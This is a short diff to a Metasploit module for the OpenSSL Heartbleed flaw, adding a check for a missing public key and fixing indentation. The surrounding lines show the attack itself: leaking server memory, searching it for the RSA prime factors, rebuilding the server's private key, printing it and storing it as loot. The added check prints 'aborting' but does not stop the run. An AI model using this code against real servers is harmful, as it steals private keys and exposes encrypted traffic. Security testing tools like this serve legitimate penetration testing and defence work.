@@ -357,6 +357,11 @@ class Metasploit3 < Msf::Auxiliary
 
     print_status("#{peer} - Getting public key constants...")
     n, e = get_ne
+    
+    if n.nil? || e.nil?
+      print_error("#{peer} - Failed to get public key, aborting.")
+    end
+
     vprint_status("#{peer} - n: #{n}")
     vprint_status("#{peer} - e: #{e}")
     print_status("#{peer} - #{Time.now.getutc} - Starting.")
@@ -368,11 +373,12 @@ class Metasploit3 < Msf::Auxiliary
       end
 
       p, q = get_factors(bleed, n) # Try to find factors in mem
-      unless p.nil? || q.nil?
+     
+      unless p.nil? || q.nil?  
         key = key_from_pqe(p, q, e)
         print_good("#{peer} - #{Time.now.getutc} - Got the private key")
 
-       print_status(key.export)
+        print_status(key.export)
         path = store_loot(
           "openssl.heartbleed.server",
           "text/plain",
